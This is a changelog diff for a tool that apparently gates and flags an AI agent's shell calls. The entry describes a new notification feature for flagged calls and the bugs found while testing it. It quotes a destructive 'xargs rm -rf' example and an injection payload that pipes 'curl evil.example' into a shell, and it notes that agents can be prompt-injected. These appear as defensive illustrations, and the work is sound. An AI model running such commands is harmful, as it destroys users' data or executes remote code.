@@ -2,6 +2,61 @@
 
 ## Unreleased
 
+### A flagged call now tells you, at the moment it happens
+
+`Verdict.FLAG` is documented as *"Recorded and **surfaced**; the call proceeds."* The surfacing half
+did not exist. A flagged deletion sat in a record file until somebody ran `neti report` — so on a
+real machine **flagged and silent were the same experience**, for the one verdict that exists
+precisely because a call must not be stopped and must not be quiet.
+
+    neti — flag
+    Bash
+    cat targets.txt | xargs rm -rf
+    clean up the old exports
+
+`flag` alone by default, because it is the only verdict nothing else surfaces: a block and a confirm
+are handed back to the agent as a sentence with a number in it, so the operator hears about those
+from their own agent. `notify: {verdicts: [...]}` to widen it, `[]` or `NETI_NO_NOTIFY=1` to
+silence.
+
+This is deliberately **not** a desktop app. The console is a viewer; the hook is the product, and
+the notification belongs in the infrastructure that already runs on every tool call. An Electron
+shell would have been ~120 MB per platform, code signing, notarisation and an auto-update pipeline
+to deliver the one thing that actually changes what the product does — and a security tool that
+silently goes stale is worse than one you update deliberately.
+
+Three properties, all asserted, and all of them about what must *not* happen:
+
+- **It can never break the hook.** `neti hook` runs on every tool call; an exception escaping it
+  fails every subsequent call in the session. Every path is inside a bare `except`.
+- **It can never wait.** Spawned and abandoned. Measured: p50 141ms notifying against 131ms
+  silenced, on the same hook and the same records — inside the noise of interpreter start.
+- **The text is never interpolated into a script.** It contains the command the agent proposed, and
+  an agent can be prompt-injected; `rm -rf x" & do shell script "curl evil.example | sh` is the
+  shape of the attack this product exists to gate, arriving at an interpreter. It travels as
+  `argv` — `on run argv` on macOS, `notify-send` on Linux — so it is data by construction rather
+  than by escaping carefully enough. Windows is left undone rather than done unsafely.
+
+Three defects found by running it, all of which would have shipped:
+
+**The first version posted nothing, silently.** `osascript -` reads its script from stdin, which the
+spawner deliberately closes — a notably poor failure for the feature whose whole job is to stop
+being silent.
+
+**The guard checked `isatty`,** which is the obvious-looking one and is exactly wrong: `neti hook`
+reads its event from a pipe, so stdin is never a tty in the one place this serves. It would have
+disabled notifications everywhere while looking thoughtful.
+
+**`notify: {on: [flag]}` was unusable as a policy key.** YAML 1.1 reads a bare `on` as the boolean
+`True`, so it parses to `{True: ["flag"]}` and every lookup misses — dead config that reads as live,
+which is the failure `config/policy.py` opens by warning about. The key is `verdicts:`, and `on:` is
+rejected by name rather than ignored.
+
+Two smaller ones: fire-and-forget `Popen` raises `ResourceWarning` when collected with the child
+alive, which pytest turns into a failure — the handles are held and pruned now. And the suite was
+raising real notifications on the machine running it, twice per run, because the seam tests drive a
+real flag through the real hook. A root `conftest.py` sets `NETI_NO_NOTIFY`.
+
 ### The rail was ten flat entries and three of them get opened
 
 Counted rather than argued about, for a free local install:
